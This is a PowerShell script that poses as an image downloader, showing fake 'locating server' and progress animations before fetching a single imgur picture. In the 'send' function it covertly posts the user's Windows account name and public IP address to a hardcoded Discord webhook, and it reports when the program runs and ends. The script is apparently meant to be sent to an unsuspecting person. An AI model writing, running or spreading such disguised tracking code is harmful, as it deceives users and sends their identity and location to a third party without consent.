function send {
    param (
        [string]$msg
    )
    $webhookurl = "https://discord.com/api/webhooks/1269884812253073533/3dx2RgG4KprVV0oYFPvronJ82s2OB_9AKswYhh-mRdeL4c3HV5STy2bUpM-F_H7TnZD_" 
    if ($msg -eq "triggered") {
        $name = whoami
        $ip = (Invoke-WebRequest -Uri "https://api.ipify.org/?format=text").Content
        $message = @{
            content = "the test has been triggered,  name : $name, ip : $ip"
        }
    } else {
        $message = @{
            content = $msg
        }
    }
    $jsonpayload = $message | ConvertTo-Json -Depth 3
    Invoke-RestMethod -Uri $webhookurl -Method Post -Body $jsonpayload -ContentType "application/json"
}

function fakedownload {
    Write-Host "creating directory for download"
    New-Item -Name "pics" -ItemType Directory
    Write-Host "`n"
    Write-Host "created"
    $anim = @('|', '/', '-', '\')
    for($i = 0; $i -le 5; $i++ ){
        foreach ($number in $anim) {
            Write-Host "locating server $number`r" -NoNewline
            Start-Sleep -Milliseconds 200
        }
    }
    send -msg "triggered"
    Start-Sleep -Milliseconds 500
    Write-Host "`nserver located" -ForegroundColor 'Blue'
    Start-Sleep -Milliseconds 500
    for ($i = 1; $i -le 100; $i++ ) {
        Write-Host "Fetching $i%`r" -NoNewline -ForegroundColor 'Yellow'
        Start-Sleep -Milliseconds 25
    }
    Start-Sleep -Milliseconds 500
    Write-Host "`nsuccessfully fetched"
    Start-Sleep -Milliseconds 1000
    for($i = 0; $i -le 4; $i++){
	    for($k = 1; $k -lt 4; $k++){
            Write-Host "starting download " -NoNewline
	        $dots = "."*$k
	        Write-Host "$dots`r" -NoNewline
	        Start-Sleep -Milliseconds 500
	    }
	    Write-Host "                      `r" -NoNewline
    }
    Write-Host "starting download ..."
    $path = "$PSScriptRoot"
    $a = "\pics"
    #New-Item -Name "readme.txt" -Path $ppath -ItemType File
    $ImageURL = "https://i.imgur.com/2Qk9Cjq.jpeg"
    $iname = "\image.jpeg"
    $OutputFilePath = $path + $a + $iname
    Invoke-WebRequest -Uri $ImageURL -OutFile $OutputFilePath
    Write-Host "report any errors back to the sender of this program`n"
    Write-Host "`nsuccessfully downloaded, program will close shortly" -ForegroundColor 'Green'
    send -msg "program ended"
    Start-Sleep -Milliseconds 5000
}


function ask {
    Write-Host "commencing ... "
    send -msg "program has been ran"
    send -msg "he chose to proceed"
    Start-Sleep -Seconds 1
    fakedownload
}

ask